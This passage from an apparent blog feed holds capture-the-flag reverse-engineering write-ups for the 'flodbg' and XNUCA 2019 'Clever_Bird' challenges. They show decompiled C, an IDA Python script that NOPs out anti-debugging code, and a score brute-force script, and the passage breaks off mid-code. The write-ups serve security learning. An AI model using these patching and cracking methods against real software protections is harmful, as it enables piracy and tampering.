punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_18<span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v17<span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">7LL</span><span class="token punctuation">,</span> <span class="token number">14LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v15<span class="token punctuation">,</span> <span class="token number">4LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v19<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">getppid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token function">get_name_by_pid</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v44<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">func3</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">,</span> <span class="token number">15LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v21<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_18<span class="token punctuation">;</span>    <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v17<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">14LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token function">getsid</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">==</span> <span class="token function">getppid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">func3</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v22<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v18<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">7LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v23<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v20<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v21<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v23<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span> i <span class="token operator">==</span> v14<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v25 <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v10 <span class="token operator">==</span> <span class="token number">19</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> v10<span class="token punctuation">;</span>      <span class="token punctuation">}</span>LABEL_18<span class="token punctuation">:</span>      <span class="token function">exit</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>LABEL_19<span class="token punctuation">:</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> LABEL_18<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>LABEL_14<span class="token punctuation">:</span>  result <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v45 <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_19<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>反调试只须一一<code>nop</code>即可，func3相当于字符替换类的函数，将不同位置的字符进行多次替换，然后与最终结果比较得到<code>win</code>，所以只须从最后状态向前推即可。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#nop掉反调试后</span>  v19 <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>  v20 <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>  v21 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v22 <span class="token operator">=</span> <span class="token number">82</span><span class="token punctuation">;</span>  v23 <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">84</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> <span class="token number">43</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>  v31 <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> <span class="token number">76</span><span class="token punctuation">;</span>  v33 <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span>  v35 <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>  v37 <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">7LL</span><span class="token punctuation">,</span> <span class="token number">14LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v10<span class="token punctuation">,</span> <span class="token number">4LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">,</span> <span class="token number">15LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v15<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">14LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">5LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">6LL</span><span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">7LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v17<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v14<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v15<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v17<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#breakpoint</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v19 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> v4<span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_10<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v4 <span class="token operator">==</span> <span class="token number">19</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>批量nop脚本:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ida_bytes <span class="token keyword">import</span> get_bytes<span class="token punctuation">,</span>patch_bytes<span class="token comment" spellcheck="true">#start_addr_nop</span>addr <span class="token operator">=</span><span class="token number">0x400BAD</span> <span class="token comment" spellcheck="true">#end_addr_nop</span>end <span class="token operator">=</span> <span class="token number">0x400BC2</span>buf_hex <span class="token operator">=</span> get_bytes<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>end <span class="token operator">-</span> addr<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>buf_hex<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'90'</span>buf <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>patch_bytes<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span></code></pre><p>最便捷的方法是动态调试，输入随机flag：<code>flag{123456789abcdef}</code>，下一个比较之前的断点，然后查看栈中字符排列顺序，可以直接得出对应次序，从而还原flag。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20191021155910.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;巅峰极客逆向flodbg：花指令，_ptrace反调试……&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="reverse" scheme="http://www.yof3ng.xyz/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA-2019-PartofRe</title>
    <link href="http://www.yof3ng.xyz/2019/09/03/XNUCA-2019-PartofRe/"/>
    <id>http://www.yof3ng.xyz/2019/09/03/XNUCA-2019-PartofRe/</id>
    <published>2019-09-03T15:24:59.000Z</published>
    <updated>2019-09-03T15:27:28.795Z</updated>
    
    <content type="html"><![CDATA[<p>XNUCA-2019，Wonderful but crazy challenges…</p><a id="more"></a><p>[TOC]</p><h1 id="XNUCA-2019-bin-record"><a href="#XNUCA-2019-bin-record" class="headerlink" title="XNUCA_2019_bin_record"></a>XNUCA_2019_bin_record</h1><blockquote><p>What a difficult and high quality game.😭</p><p>I Get Zero Flag! Teammate tql orz.</p></blockquote><h2 id="Clever-Bird"><a href="#Clever-Bird" class="headerlink" title="Clever_Bird"></a>Clever_Bird</h2><p>This Challenge’s attachment is an <code>exe</code> format file. You can see following <code>dos</code> game after runing <code>Clever Bird.exe</code>.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831100219.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831100959.png" alt=""></p><p>Apparently，you can get flag in two ways：</p><p><code>1.High Scores</code></p><p><code>2.Crack The Game</code></p><p>I choose analyse it by <code>IDA Pro</code> and <code>X64dbg</code>…</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831101357.png" alt=""></p><p>Firstly，Program has a key point compare at <code>.text:011F1DCA</code>，only when this compare is true，can you get into the <code>segment contains flag</code>.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831102332.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831102042.png" alt=""></p><p>Here is a <a href="https://www.52pojie.cn/thread-1013656-2-1.html" target="_blank" rel="noopener">python script</a> to get correct score.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">def</span> <span class="token function">h2f</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    cp <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    fp <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>cp<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>POINTER<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_float<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> fp<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value<span class="token keyword">def</span> <span class="token function">f2h</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    fp <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_float<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    cp <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>fp<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>POINTER<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cp<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    X<span class="token operator">=</span><span class="token number">0</span>    score<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token operator">-</span>h2f<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token operator">*</span>h2f<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>score<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>h2f<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100000000</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0x436AE</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        score<span class="token operator">+=</span><span class="token number">1</span>        X<span class="token operator">=</span><span class="token number">0x5F3759D8</span> <span class="token operator">-</span> <span class="token punctuation">(</span>f2h<span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> X<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            X<span class="token operator">+=</span><span class="token number">7</span>    <span class="token keyword">print</span> score</code></pre><p>Then you will get the score:</p><pre class=" language-c"><code class="language-c"><span class="token macro property"># v12 == score</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v16 <span class="token operator">=</span> <span class="token operator">&amp;</span>v37<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v17 <span class="token operator">=</span> <span class="token operator">*</span>v16<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v17 <span class="token operator">!=</span> v12 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        v12 <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v12 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>It still has a role to play after the compare:</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">:</span> li <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span> score <span class="token operator">=</span> <span class="token number">0x20002</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>     bit <span class="token operator">=</span> chr<span class="token punctuation">(</span>score<span class="token operator">%</span><span class="token number">2</span><span class="token operator">+</span>ord<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>     li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#print(score)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>     score <span class="token operator">=</span> score<span class="token operator">>></span><span class="token number">1</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>score<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span>         <span class="token keyword">break</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span> In <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>li<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'010000000000000001'</span></code></pre><p>The lastest key func:</p><pre class=" language-c"><code class="language-c">      v18 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v19 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ConsoleCursorInfo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dwSize <span class="token operator">+</span> v18<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">>></span> v19<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>Dst<span class="token punctuation">[</span>v18<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v19 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v18<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v19 <span class="token operator">>=</span> <span class="token number">32</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          v20 <span class="token operator">=</span> <span class="token function">sub_11F23E0</span><span class="token punctuation">(</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"congratulation,submit with format: flag{key}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          std<span class="token punctuation">:</span><span class="token punctuation">:</span>basic_ostream<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> sub_11F2620<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">sub_11F1F40</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Src<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token 